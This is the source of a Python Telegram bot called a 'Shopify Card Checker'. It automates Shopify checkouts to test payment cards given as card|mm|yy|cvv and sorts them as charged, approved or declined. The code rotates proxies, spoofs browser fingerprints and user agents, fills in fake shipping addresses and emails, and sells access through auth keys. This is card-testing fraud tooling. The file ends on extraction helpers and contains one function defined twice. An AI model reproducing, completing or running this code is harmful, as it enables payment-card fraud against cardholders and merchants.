#!/usr/bin/env python3
# =============================================================================
#  habash — Shopify Card Checker Bot  (single-file edition)
# =============================================================================
#
#  SETUP INSTRUCTIONS
#  ------------------
#  1. Install dependencies:
#       pip install telethon curl_cffi aiohttp aiofiles requests urllib3
#
#  2. Run the bot:
#       python3 habash_bot.py
#
#  3. Configuration (edit the CONFIG section below or set env vars):
#       BOT_TOKEN   — Telegram bot token from @BotFather
#       API_ID      — Telegram API ID (from my.telegram.org)
#       API_HASH    — Telegram API hash (from my.telegram.org)
#       ADMIN_ID    — Your Telegram user ID (get it from @userinfobot)
#
#  4. First run creates a session file (checker_bot.session) in the same folder.
#     Keep that file — it stores the bot login session.
#
#  5. Files created automatically on first run:
#       sites.txt          — list of Shopify store URLs (one per line)
#       sites_meta.json    — price-tier tags per site
#       proxies.txt        — proxy pool (host:port:user:pass, one per line)
#       users.json         — registered users / keys
#       card_logs.json     — check result history
#       user_stats.json    — per-user stats
#       admin.json         — admin IDs
#       user_prefs.json    — per-user settings
#
#  COMMANDS (admin)
#  ----------------
#   /addsite <url>         Add a Shopify store to the pool
#   /delsite <url>         Remove a store
#   /listsites             List all stores
#   /tagsite <url> <tier>  Tag a store with a price tier ($1/$5/$10/$20)
#   /addproxy <proxy>      Add a proxy to the pool
#   /delproxy <proxy>      Remove a proxy
#   /listproxies           List all proxies
#   /addkey <key>          Create an auth key
#   /delkey <key>          Delete an auth key
#   /listkeys              List all keys
#   /setadmin <id>         Grant admin rights
#   /broadcast <msg>       Send a message to all users
#   /testcards             Test card display styles
#
#  COMMANDS (user)
#  ---------------
#   /sh <card|mm|yy|cvv>   Single card check
#   /msh                   Mass check (reply to .txt file)
#   /ran <card|mm|yy|cvv>  Single check on random site
#   /ran                   Mass check random site per card (reply to .txt)
#   /setproxy <proxy>      Set your personal proxy
#   /setamount <tier>      Filter sites by price ($1/$5/$10/$20/any)
#   /redeem <key>          Activate an auth key
#   /me                    Your account info & stats
#   /help                  Command list
#
# =============================================================================

import json
import random
import re
import time
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime

import asyncio
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

SITE_TXT = Path(__file__).parent / "site.txt"
MAX_SITE_AMOUNT = 15.0
SITE_ERROR_THRESHOLD = 8   # auto-remove site after N consecutive errors
                           # رُفع من 3 إلى 8: يمنع حذف المواقع الجيدة بسبب أخطاء مؤقتة قليلة
SITE_META_FILE = "sites_meta.json"

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "chrome110", "chrome107", "edge101", "safari15_5", "safari17_0"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class WorkingSite:
    url: str
    amount: float

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael","johnson", "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert","williams", "456 Main St",            "",          "Houston",       "US", "TX",  "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown",    "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139", "+13055550100", "hotmail.com"),
    "CA":    Address("john",  "smith",    "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william","davis",   "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":    Address("james", "wilson",   "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "GB-MAN":Address("oliver","martinez","123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":    Address("thomas","taylor",   "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",    "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel","anderson", "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",    "+61398765432",  "yahoo.com"),
    "DE":    Address("lucas", "thomas",   "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",   "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix", "schmidt",  "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",   "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",  "bernard",  "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",   "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis", "petit",    "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",   "+33487654321",  "outlook.com"),
    "NZ":    Address("jack",  "wilson",   "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",    "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",  "brown",    "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",    "+6449876543",   "gmail.com"),
    "IE":    Address("sean",  "murphy",   "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006","+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",  "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88","+35321456789",  "gmail.com"),
    "NL":    Address("bas",   "jansen",   "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS", "+31201234567",  "gmail.com"),
    "ES":    Address("carlos","garcia",   "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",   "+34912345678",  "gmail.com"),
    "IT":    Address("marco", "rossi",    "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",   "+39061234567",  "gmail.com"),
    "SE":    Address("erik",  "andersson","Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",  "+468123456",    "gmail.com"),
    "NO":    Address("olav",  "hansen",   "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",    "+4721234567",   "gmail.com"),
    "DK":    Address("lars",  "nielsen",  "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",    "+4531234567",   "gmail.com"),
    "FI":    Address("jussi", "korhonen", "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",   "+35891234567",  "gmail.com"),
    "BE":    Address("jan",   "peeters",  "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",    "+3221234567",   "gmail.com"),
    "CH":    Address("hans",  "weber",    "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",    "+41441234567",  "gmail.com"),
    "AT":    Address("markus","gruber",   "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",    "+4312345678",   "gmail.com"),
    "JP":    Address("takashi","yamamoto","1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005","+81312345678",  "gmail.com"),
    "SG":    Address("wei",   "tan",      "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",  "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
}

# Fallback order when US shipping is rejected — tried in this sequence
SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    """Return ordered list of fallback addresses excluding the already-tried country."""
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout   = timeout
        self.proxy_url = proxy_url or ""
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self.proxy_url:
            kwargs.setdefault('proxy', self.proxy_url)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        if self.proxy_url:
            kwargs.setdefault('proxy', self.proxy_url)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ──────────────────────── Site fetching ──────────────────────────────

def choose_affordable_site(api_url: str, max_amount: float) -> "WorkingSite":
    sites = fetch_affordable_sites(api_url, max_amount)
    if not sites:
        raise Exception(f"no sites <= {max_amount} from {api_url}")
    return random.choice(sites)

def fetch_affordable_sites(api_url: str, max_amount: float) -> List["WorkingSite"]:
    page_size = 100
    out: List[WorkingSite] = []
    seen: set = set()
    offset = 0
    MAX_PAGES = 20

    for _ in range(MAX_PAGES):
        page_url = f"{api_url}?limit={page_size}&offset={offset}"
        try:
            resp = requests.get(page_url, timeout=12)
            if resp.status_code != 200:
                if out:
                    break
                raise Exception(f"GET {page_url} returned {resp.status_code}")

            body = resp.text.strip()
            if body.startswith("<!DOCTYPE html") or "<tbody>" in body:
                return parse_dashboard_html_sites(body, max_amount)

            payload   = resp.json()
            page_sites = collect_objects(payload)
            if not page_sites:
                break

            for obj in page_sites:
                site_url = extract_site_url(obj)
                if not site_url:
                    continue
                amount, ok = extract_amount(obj)
                if not ok or amount > max_amount:
                    continue
                if site_url in seen:
                    continue
                seen.add(site_url)
                out.append(WorkingSite(url=site_url, amount=amount))

            if len(page_sites) < page_size:
                break
            offset += page_size

        except Exception:
            if out:
                break
            raise

    if not out:
        raise Exception("no affordable sites found in API payload")

    print(f"[SITES] fetched {len(out)} affordable sites (under ${max_amount:.0f})")
    return out

def parse_dashboard_html_sites(html_body: str, max_amount: float) -> List["WorkingSite"]:
    row_re = re.compile(r'<a href="(https?://[^"]+)"[^>]*>[^<]*</a>\s*<td class="price">\$?([^<]+)\s*</td>')
    out, seen = [], set()
    for match in row_re.findall(html_body):
        site_url = match[0].strip().rstrip('/')
        amount, ok = to_float(match[1].strip())
        if not ok or amount > max_amount or site_url in seen:
            continue
        seen.add(site_url)
        out.append(WorkingSite(url=site_url, amount=amount))
    return out

def collect_objects(v: Any) -> List[Dict]:
    out = []
    if isinstance(v, dict):
        out.append(v)
        for child in v.values():
            out.extend(collect_objects(child))
    elif isinstance(v, list):
        for child in v:
            out.extend(collect_objects(child))
    return out

def extract_site_url(obj: Dict) -> str:
    for k in ["site","url","shop_url","shopUrl","shop","domain","website"]:
        raw = obj.get(k)
        if not raw:
            continue
        s = str(raw).strip()
        if not s.startswith(("http://","https://")):
            s = "https://" + s
        try:
            parsed = urllib.parse.urlparse(s)
            if parsed.netloc:
                return f"{parsed.scheme}://{parsed.netloc}".rstrip('/')
        except Exception:
            continue
    return ""

def extract_amount(obj: Dict) -> Tuple[float, bool]:
    for k in ["amount","price","checkout_price","value","min_amount","minAmount"]:
        raw = obj.get(k)
        if raw is not None:
            n, ok = to_float(raw)
            if ok:
                return n, True
    return 0, False

def to_float(v: Any) -> Tuple[float, bool]:
    if isinstance(v, (int, float)):
        return float(v), True
    if isinstance(v, str):
        match = re.search(r'[-+]?\d*\.?\d+', v)
        if match:
            try:
                return float(match.group()), True
            except ValueError:
                pass
    return 0, False

# ──────────────────────── Step 0: cheapest product ───────────────────

def find_cheapest_product(client: TLSClient, shop_url: str, min_price: float = 0.50) -> Tuple[str, str, str, str]:
    best_price = float('inf')
    product_title = product_id = variant_id = price_str = ""

    page = 1
    while True:
        for attempt in range(3):
            resp = client.get(f"{shop_url}/products.json?limit=250&page={page}")
            if resp.status_code == 200:
                break
            if resp.status_code in (503, 502, 429, 500) and attempt < 2:
                import time as _t; _t.sleep(2 + attempt * 2)
                continue
            raise Exception(f"GET products.json page {page} returned {resp.status_code}")

        products = resp.json().get("products", [])
        if not products:
            break

        for p in products:
            for v in p.get("variants", []):
                if not v.get("available", False):
                    continue
                try:
                    price = float(v.get("price") or 0)
                except (ValueError, TypeError):
                    continue
                if price < min_price:
                    continue
                if price < best_price:
                    best_price    = price
                    product_title = p.get("title", "")
                    product_id    = str(p.get("id", ""))
                    variant_id    = str(v.get("id", ""))
                    price_str     = v.get("price", "")
        page += 1

    if not product_title:
        raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

    return product_title, product_id, variant_id, price_str

# ──────────────────────── Step 1: cart → checkout ────────────────────

def add_to_cart_and_checkout(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    cart_permalink = f"{shop_url}/cart/{variant_id}:1"
    checkout_resp  = client.get(cart_permalink, allow_redirects=True, headers={
        "accept":                    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "accept-language":           "en-US,en;q=0.9,en-IN;q=0.8",
        "cache-control":             "no-cache",
        "pragma":                    "no-cache",
        "referer":                   shop_url + "/",
        "sec-ch-ua":                 '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile":          "?0",
        "sec-ch-ua-platform":        '"Windows"',
        "sec-fetch-dest":            "document",
        "sec-fetch-mode":            "navigate",
        "sec-fetch-site":            "same-origin",
        "sec-fetch-user":            "?1",
        "upgrade-insecure-requests": "1",
    })

    if checkout_resp.status_code not in (200, 302):
        raise Exception(f"cart permalink returned {checkout_resp.status_code}")

    checkout_url   = checkout_resp.url
    checkout_html  = checkout_resp.text

    token_match    = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""

    session_match  = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
    session_token  = html.unescape(session_match.group(1)).strip('"') if session_match else ""

    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── Step 2: private access token ───────────────

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def fetch_private_access_token(client: TLSClient, shop_url: str, checkout_url: str, pat_id: str) -> str:
    req_url = f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1"
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(req_url, headers=headers)
    return f"[{resp.status_code}] {resp.text}"

# ──────────────────────── Step 3: actions JS ─────────────────────────

def extract_actions_js_url(checkout_html: str, shop_url: str) -> str:
    match = re.search(r'(/cdn/shopifycloud/checkout-web/assets/c1/actions[A-Za-z0-9_-]*\.[A-Za-z0-9_-]+\.js)', checkout_html)
    return shop_url + match.group(1) if match else ""

def fetch_actions_js(client: TLSClient, actions_url: str, shop_url: str) -> str:
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "origin": shop_url,
        "priority": "u=1",
        "sec-ch-ua": '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "script",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
    }
    resp = client.get(actions_url, headers=headers)
    if resp.status_code != 200:
        raise Exception(f"GET actions JS returned {resp.status_code}")
    return resp.text

def extract_proposal_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"Proposal"', js_body)
    return match.group(1) if match else ""

def extract_submit_for_completion_id(js_body: str) -> str:
    match = re.search(r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"mutation"\s*,\s*name:\s*"SubmitForCompletion"', js_body)
    return match.group(1) if match else ""

def extract_poll_for_receipt_id(js_body: str) -> str:
    patterns = [
        r'id:\s*"([a-f0-9]{64})"\s*,\s*type:\s*"query"\s*,\s*name:\s*"PollForReceipt"',
        r'name:\s*"PollForReceipt"\s*,\s*type:\s*"query"\s*,\s*id:\s*"([a-f0-9]{64})"',
        r'"PollForReceipt"[^}]{0,200}id:\s*"([a-f0-9]{64})"',
        r'PollForReceipt.{0,300}?([a-f0-9]{64})',
    ]
    for p in patterns:
        match = re.search(p, js_body)
        if match:
            return match.group(1)
    return ""

# ──────────────────────── Extraction helpers ─────────────────────────

def extract_queue_token(proposal_json: str) -> str:
    match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', proposal_json)
    return match.group(1) if match else ""

def extract_is_shipping_required(proposal_json: str) -> bool:
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True

def extract_stable_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', unescaped)
    return match.group(1) if match else ""

def extract_commit_sha(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
    return match.group(1) if match else ""

def extract_source_token(checkout_html: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', checkout_html)
    return html.unescape(match.group(1)).strip('"') if match else ""

def extract_identification_signature(checkout_html: str) -> str:
    unescaped = checkout_html.replace('&quot;', '"')
    for pattern in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'CardsinkCallerIdentificationSignature":"([^"]+)"',
        r'cardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pattern, unescaped)
        if m:
            return m.group(1)
    return ""


def extract_vault_url(checkout_html: str) -> str:
    """Return the actual PCI sessions endpoint embedded in the checkout page, or empty."""
    decoded = checkout_html.replace('&quot;', '"')
    # Direct sessions URL (shopifycs or shopifyinc CDN)
    m = re.search(r'(https://[a-z0-9._-]*(?:shopifycs|shopifyinc)\.[a-z.]+/sessions)', decoded)
    if m:
        return m.group(1)
    # hostedFields url  →  trim trailing path and append /sessions
    hf = re.search(r'"hostedFields"[^}]*"url"\s*:\s*"(https://[^"]+)"', decoded)
    if hf:
        return hf.group(1).rsplit("/", 2)[0] + "/sessions"
    return ""


def extract_vault_domain(checkout_html: str) -> str:
    """Return the per-store vault domain used as payment_session_scope."""
    decoded = checkout_html.replace('&quot;', '"')
    m = re.search(r'hostedFieldsUrl[^}]+"domain"\s*:\s*"([^"]+)"', decoded)
    if m:
        return m.group(1)


# ─── STRING EXTRACTION HELPERS (merged from shop.py) ──────────────────
# capture() / extract_between() are lean, exception-safe substring
# extractors used throughout the async checkout path (see
# run_checkout_for_card_async).  They replace ad-hoc try/except
# index-slicing scattered in the original code.

def capture(data: str, first: str, last: str):
    """
    Return the substring of *data* that lies between *first* and *last*.
    Returns None (not an exception) when either delimiter is absent — safe
    to use in any 'if value:' guard.
    """
    try:
        start = data.index(first) + len(first)
        end   = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text: str, start: str, end: str):
    """
    Variant of capture() with explicit None-guard on arguments.
    Preferred in async checkout steps where the input may already be None.
    """
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
        return None
    except Exception:
        return None

def extract_pci_session_id(pci_body: str) -> str:
    match = re.search(r'"id"\s*:\s*"([^"]+)"', pci_body)
    return match.group(1) if match else ""

def extract_private_access_token_id(checkout_html: str) -> str:
    unescaped = html.unescape(checkout_html)
    match = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', unescaped)
    return match.group(1) if match else ""

def extract_delivery_handle(proposal_body: str) -> str:
    """Extract delivery handle — JSON-first, then flexible regex fallbacks."""
    # 1. JSON path (most reliable — field order doesn't matter)
    try:
        data   = json.loads(proposal_body)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        # Direct path: sellerProposal.selectedDeliveryStrategy.handle
        sds = seller.get("selectedDeliveryStrategy", {})
        if isinstance(sds, dict) and sds.get("handle"):
            return sds["handle"]
        # deliveryExpectations[].handle
        de = seller.get("deliveryExpectations", {})
        if isinstance(de, dict):
            for exp in de.get("deliveryExpectations", []):
                if isinstance(exp, dict) and exp.get("handle"):
                    return exp["handle"]
        # deliveryGroups[].deliveryOptions[].handle
        for dg in seller.get("deliveryGroups", []):
            if isinstance(dg, dict):
                for opt in dg.get("deliveryOptions", []):
                    if isinstance(opt, dict) and opt.get("handle"):
                        return opt["handle"]
    except Exception:
        pass

    # 2. Flexible regex — selectedDeliveryStrategy block, any field order
    m = re.search(r'"selectedDeliveryStrategy"\s*:\s*\{[^{}]*"handle"\s*:\s*"([^"]+)"', proposal_body)
    if m:
        return m.group(1)

    # 3. Handle before __typename (reversed order)
    m = re.search(
        r'"handle"\s*:\s*"([^"]+)"[^}]{0,120}"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        proposal_body)
    if m:
        return m.group(1)

    # 4. __typename before handle (original assumption)
    m = re.search(
        r'"__typename"\s*:\s*"CompleteDeliveryStrategy"[^}]{0,120}"handle"\s*:\s*"([^"]+)"',
        proposal_body)
    if m:
        return m.group(1)

    # 5. Original strict pattern (kept for compat)
    m = re.search(
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"\s*,\s*"__typename"\s*:\s*"CompleteDeliveryStrategy"',
        proposal_body)
    if m:
        return m.group(1)

    # 6. Loose UUID/token fallback (any length, hex or base64-url chars)
    m = re.search(r'"handle"\s*:\s*"([A-Za-z0-9+/=_\-]{20,})"', proposal_body)
    if m:
        return m.group(1)

    return ""

def extract_signed_handles(proposal_json: str) -> List[str]:
    """JSON-based signed handle extractor — authoritative, no regex conflicts."""
    try:
        data   = json.loads(proposal_json)
        seller = (data.get("data", {})
                      .get("session", {})
                      .get("negotiate", {})
                      .get("result", {})
                      .get("sellerProposal", {}))
        de          = seller.get("deliveryExpectations", {})
        de_typename = de.get("__typename", "")

        if de_typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", []) if x.get("signedHandle")]

        if "deliveryExpectations" in de:
            expectations = de.get("deliveryExpectations", [])
            if isinstance(expectations, list):
                handles = [x.get("signedHandle") for x in expectations if x.get("signedHandle")]
                if handles:
                    return handles

        if de_typename in ["UnfilledDeliveryExpectationTerms", "UnavailableTerms"]:
            return []

    except Exception:
        pass
    return []

def extract_shipping_amount(proposal_body: str) -> str:
    match = re.search(
        r'"deliveryStrategyBreakdown"\s*:\s*\[\s*\{\s*"amount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_checkout_total(proposal_body: str) -> str:
    match = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_total(proposal_body: str) -> str:
    match = re.search(r'"total"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_running_total(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("runningTotal", {})
                    .get("value", {}))
        return val.get("amount", "")
    except Exception:
        return ""

def extract_seller_merchandise_price(proposal_body: str) -> str:
    match = re.search(
        r'"ContextualizedProductVariantMerchandise".*?"totalAmount"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"',
        proposal_body)
    return match.group(1) if match else ""

def extract_seller_currency(proposal_body: str) -> str:
    match = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_seller_country(proposal_body: str) -> str:
    match = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', proposal_body)
    return match.group(1) if match else ""

def extract_tax_amount(proposal_json: str) -> str:
    try:
        data = json.loads(proposal_json)
        val  = (data.get("data", {})
                    .get("session", {})
                    .get("negotiate", {})
                    .get("result", {})
                    .get("sellerProposal", {})
                    .get("tax", {})
                    .get("totalTaxAmount", {})
                    .get("value", {}))
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"

def extract_tax_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        return (seller.get("tax", {})
                      .get("totalTaxAmount", {})
                      .get("value", {})
                      .get("amount", "0.0"))
    except Exception:
        return "0.0"

def extract_total_from_rejected(submit_json: str) -> str:
    try:
        data   = json.loads(submit_json)
        seller = (data.get("data", {})
                      .get("submitForCompletion", {})
                      .get("sellerProposal", {}))
        for key in ("checkoutTotal", "total", "runningTotal"):
            val = seller.get(key, {}).get("value", {}).get("amount")
            if val:
                return val
        return ""
    except Exception:
        return ""

def extract_receipt_id(submit_body: str) -> str:
    # Match any Shopify receipt GID (ProcessedReceipt, ProcessingReceipt, etc.)
    # Receipt IDs can be numeric or hex hashes
    match = re.search(r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"', submit_body)
    return match.group(1) if match else ""

def extract_receipt_session_token(submit_body: str) -> str:
    match = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', submit_body)
    return match.group(1) if match else ""

